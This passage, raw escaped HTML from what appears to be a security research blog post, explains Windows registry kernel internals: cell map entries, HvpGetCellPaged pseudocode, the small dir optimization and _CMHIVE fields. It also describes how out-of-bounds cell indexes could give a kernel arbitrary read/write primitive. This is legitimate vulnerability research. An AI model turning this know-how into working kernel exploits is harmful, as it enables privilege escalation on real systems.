tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Indicates that the whole bin is empty and consists of a single free cell.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;MAP_ENTRY_TRIMMED:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Indicates that the page has been marked as &amp;quot;trimmed&amp;quot; in HvTrimHive. More specifically, this property is related to hive reorganization, and is set during the loading process on some number of trailing pages that only contain keys accessed during boot, or not accessed at all since the last reorganization. The overarching goal is likely to prevent introducing unnecessary fragmentation in the hive by avoiding mixing together keys with different access histories.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;MAP_ENTRY_DUMMY:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;Indicates that the page is allocated from the kernel pool and isn&amp;#39;t part of a section view.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c25&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;With this in mind, let&amp;#39;s dive into the details of each _HMAP_ENTRY structure member:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c17&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_rsqcvs5pzvc3-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;PermanentBinAddress:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;The lower 4 bits contain the above flags. The upper 60 bits represent the base address of the bin mapping corresponding to this page.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;BlockOffset:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;This field has a dual functionality. If the MAP_ENTRY_DISCARDABLE flag is set, it is a pointer to a descriptor of a free bin, _FREE_HBIN, linked into the _DUAL.FreeBins linked list. If it is clear (the typical case), it expresses the offset of the page relative to the start of the bin. Therefore, the virtual address of the block&amp;#39;s data in memory can be calculated as (PermanentBinAddress &amp;amp; (~0xF)) + BlockOffset.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c25 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;MemAlloc:&lt;/span&gt;&lt;span&gt;&amp;nbsp;If the MAP_ENTRY_NEW_ALLOC flag is set, it contains the size of the bin, otherwise it is zero.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;And this concludes the description of how cell maps are structured. Taking all of it into account, the implementation of the HvpGetCellPaged function starts to make a lot of sense. Its pseudocode comes down to the following:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_CELL_DATA&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;*HvpGetCellPaged(_HHIVE&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;*Hive,&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;HCELL_INDEX&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;Index)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;_HMAP_ENTRY&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;*Entry&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;amp;Hive-&amp;gt;Storage[Index&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c11&quot;&gt;].Map&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -&amp;gt;Directory[(Index&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x3FF&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c11&quot;&gt;]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; -&amp;gt;Table[(Index&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0x1FF&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c8&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c4 tTszyzmaCA-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c28&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;(Entry-&amp;gt;PermanentBinAddress&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;(~&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0xF&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;Entry-&amp;gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;(Index&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;0xFFF&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c19&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c9 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c2 tTszyzmaCA-c11&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c23&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;br/&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;The same process is followed, for example, by the implementation of the WinDbg !reg cellindex extension, which also translates a pair of a hive pointer and a cell index into the virtual address of the cell.&lt;/span&gt;&lt;/p&gt;&lt;h5 class=&quot;tTszyzmaCA-c56 tTszyzmaCA-c13&quot; id=&quot;h.n6qbxciqpihy&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c36 tTszyzmaCA-c4&quot;&gt;The small dir optimization&lt;/span&gt;&lt;/h5&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;There is one other implementation detail about the cell maps worth mentioning here &amp;ndash; the small dir optimization. Let&amp;#39;s start with the observation that a majority of registry hives in Windows are relatively small, below 2 MiB in size. This can be easily verified by using the !reg hivelist command in WinDbg, and taking note of the values in the &amp;quot;Stable Length&amp;quot; and &amp;quot;Volatile Length&amp;quot; columns. Most of them usually contain values between several kilobytes to hundreds of kilobytes. This would mean that if the kernel allocated the full first-level directory for these hives (taking up 1024 entries &amp;times; 8 bytes = 8 KiB on 64-bit platforms), they would still only use the first element in it, leading to a non-trivial waste of memory &amp;ndash; especially in the context of the early 1990&amp;#39;s when the registry was first implemented. In order to optimize this common scenario, Windows developers employed an unconventional approach to simulate a 1-item long &amp;quot;array&amp;quot; with the SmallDir member of type _HMAP_TABLE in the _DUAL structure, and have the _DUAL.Map pointer point at it instead of a separate pool allocation when possible. Later, whenever the hive grows and requires more than one element of the cell map directory, the kernel falls back to the standard behavior and performs a normal pool allocation for the directory array.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;A revised diagram illustrating the cell map layout of a small hive is shown below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c39 tTszyzmaCA-c13&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjb62kYOUriRjh1B1hzYJFnWCpLi69AEJ0QoqVBlVSlifW4Wjdyg0w-kQCPdsqlpSPtiSv1YfG137ej2Cl3RxY0B45XPcrNWWnsbFUvbNd9aE5tJ32_pYcKK3gq72fdZeO5PLnOHaLbj-rJCfWMwpYyh424tfQ30HsIrluDkS0xTd0haV-xZMTB8i4XVlQ/s1200/image2.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjb62kYOUriRjh1B1hzYJFnWCpLi69AEJ0QoqVBlVSlifW4Wjdyg0w-kQCPdsqlpSPtiSv1YfG137ej2Cl3RxY0B45XPcrNWWnsbFUvbNd9aE5tJ32_pYcKK3gq72fdZeO5PLnOHaLbj-rJCfWMwpYyh424tfQ30HsIrluDkS0xTd0haV-xZMTB8i4XVlQ/s1200/image2.png&quot; border=&quot;0&quot; alt=&quot;Diagram illustrating the Windows Registry cell index structure and lookup process with the &amp;quot;small dir&amp;quot; optimization applied for small hives. It shows the Cell index fields (Storage selector, Directory index, Table index, Byte offset). The Directory index points to a &amp;quot;Small directory&amp;quot; structure, visually indicating that although the index allows for 1024 entries, only the first entry is typically represented by the embedded structure in this optimized scenario to save memory, with the rest marked as unused initially. The lookup proceeds via Storage list, Small directory, and Table to locate the target Cell block.&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram illustrating the Windows Registry cell index structure and lookup process with the &amp;quot;small dir&amp;quot; optimization applied for small hives. It shows the Cell index fields (Storage selector, Directory index, Table index, Byte offset). The Directory index points to a &amp;quot;Small directory&amp;quot; structure, visually indicating that although the index allows for 1024 entries, only the first entry is typically represented by the embedded structure in this optimized scenario to save memory, with the rest marked as unused initially. The lookup proceeds via Storage list, Small directory, and Table to locate the target Cell block.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Here, we can see that indexes 1 through 1023 of the directory array are invalid. Instead of correctly initialized _HMAP_TABLE structures, they point into &amp;quot;random&amp;quot; data corresponding to other members of the _DUAL and the larger _CMHIVE structure that happen to be located after _DUAL.SmallDir. Ordinarily, this is merely a low-level detail that doesn&amp;#39;t have any meaningful implications, as all actively loaded hives remain internally consistent and always contain cell indexes that remain within the bounds of the hive&amp;#39;s storage space. However, if we look at it through the security lens of hive-based memory corruption, this behavior suddenly becomes very interesting. If an attacker was able to implant an out-of-bounds cell index with the directory index greater than 0 into a hive, they would be able to get the kernel to operate on invalid (but deterministic) data as part of the cell map walk, and enable a powerful arbitrary read/write primitive. In addition to the small dir optimization, this technique is also enabled by the fact that the HvpGetCellPaged routine doesn&amp;#39;t perform any bounds checks of the cell indexes, instead blindly trusting that they are always valid.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;If you are curious to learn more about the exploitation aspect of out-of-bounds cell indexes, it was the main subject of my &lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c22&quot;&gt;&lt;a href=&quot;https://j00ru.vexillium.org/talks/offensivecon-practical-exploitation-of-windows-registry-vulnerabilities/&quot;&gt;Practical Exploitation of Registry Vulnerabilities in the Windows Kernel&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;talk given at OffensiveCon 2024 (slides and video recording are available). I will also discuss it in more detail in one of the future blog posts focused specifically on the security impact of registry vulnerabilities.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;tTszyzmaCA-c12&quot; id=&quot;h.xe7wqcyg45wp&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c16 tTszyzmaCA-c4&quot;&gt;_CMHIVE structure overview&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;Beyond the first member of type _HHIVE at offset 0, the _CMHIVE structure contains more than 3 KiB of further information describing an active hive. This data relates to concepts more abstract than memory management, such as the registry tree structure itself. Below, instead of a field-by-field analysis, we&amp;#39;ll focus on the general categories of information within _CMHIVE, organized loosely by increasing complexity of the data structures:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_s0pfb3xl5agk-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Reference count:&lt;/span&gt;&lt;span&gt;&amp;nbsp;a 32-bit refcount primarily used during short-term operations on the hive, to prevent the object from being freed while actively operated on. These are used by the thin wrappers CmpReferenceHive and CmpDereferenceHive.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;File handles and sizes:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;handles and current sizes of the hive files on disk, such as the main hive file (.DAT) and the accompanying log files (.LOG, .LOG1, .LOG2). The handles are stored in FileHandles array, and the sizes reside in ActualFileSize and LogFileSizes.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Text strings:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;some informational strings that may prove useful when trying to identify a hive based on its _CMHIVE structure. For example, the hive file name is stored in FileUserName, and the hive mount point path is stored in HiveRootPath.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Timestamps:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;there are several timestamps that can be found in the hive descriptor, such as DirtyTime, UnreconciledTime or LastWriteTime.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;List entries:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;instances of the _LIST_ENTRY structure used to link the hive into various double-linked lists, such as the global list of hives in the system (HiveList, starting at nt!CmpHiveListHead), or the list of hives within a common trust class (TrustClassEntry).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Synchronization mechanisms:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;various objects used to synchronize access to the hive as a whole, or some of its parts. Examples include HiveRundown, SecurityLock and HandleClosePendingEvent.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Unload history:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;a 128-element array that stores the number of steps that have been successfully completed in the process of unloading the hive. Its specific purpose is unclear, it might be a debugging artifact retained from older versions of Windows.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Late unload state:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;objects related to deferred unloading of registry hives (LateUnloadWorkItemState, LateUnloadFinishedEvent, LateUnloadWorkItem).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Hive layout information:&lt;/span&gt;&lt;span&gt;&amp;nbsp;the hive reorganization process in Windows tries to optimize hives by grouping together keys accessed during system runtime, followed by keys accessed during system boot, &lt;/span&gt;&lt;span&gt;followed by completely unused keys&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;. If a hive is structured according to this order during load, the kernel saves information about the boundaries between the three distinct areas in the BootStart, UnaccessedStart and UnaccessedEnd members of _CMHIVE.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Flushing state and dirty block information:&lt;/span&gt;&lt;span&gt;&amp;nbsp;any state that has to do with marking cells as dirty and synchronizing their contents to disk. There are a significant number of fields related to the functionality, with names starting with &amp;quot;Flush...&amp;quot;, &amp;quot;Unreconciled...&amp;quot; and &amp;quot;CapturedUnreconciled...&amp;quot;.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Volume context:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;a pointer to a public _CMP_VOLUME_CONTEXT structure, which provides extended information about the disk volume of the hive file. As an example, it is used in the internal CmpVolumeContextMustHiveFilePagesBeKeptLocal routine to determine whether the volume is a system one, and consequently whether certain security/reliability assumptions are guaranteed for it or not.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;KCB table and root KCB:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;a table of the globally visible KCB (Key Control Block) structures corresponding to keys in the hive, and a pointer to the root key&amp;#39;s KCB. I will discuss KCBs in more detail in the &amp;quot;Key structures&amp;quot; section below.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Security descriptor cache:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;a cache of all security descriptors present in the hive, allocated from the kernel pool and thus accessible more efficiently than the underlying hive mappings. In my bug reports, I have often taken advantage of the security cache as a straightforward way to demonstrate the exploitability of security descriptor use-after-frees. A security node UAF can be easily converted into an UAF of its pool-based cached object, which then reliably triggers a Blue Screen of Death when Special Pool is enabled. The security cache of any given hive can be enumerated using the !reg seccache command in WinDbg.&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c0 c15 li-bullet-0&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c5&quot;&gt;Transaction-related objects:&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&amp;nbsp;a pointer to a _CM_RM structure that describes the Resource Manager object associated with the hive, if &amp;quot;heavyweight&amp;quot; transactions (i.e. KTM transactions) are enabled for it.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;tTszyzmaCA-c0 tTszyzmaCA-c29&quot;&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;tTszyzmaCA-c0&quot;&gt;&lt;span&gt;Last but not least, &lt;/span&gt;&lt;span&gt;_CMHIVE has its own Flags field that is different from _HHIVE.Flags&lt;/span&gt;&lt;span class=&quot;tTszyzmaCA-c6 tTszyzmaCA-c4&quot;&gt;. As usual, the flags are not documented, so the listing below is a product of my own analysis:&lt;/span&gt;&lt;/p&gt;
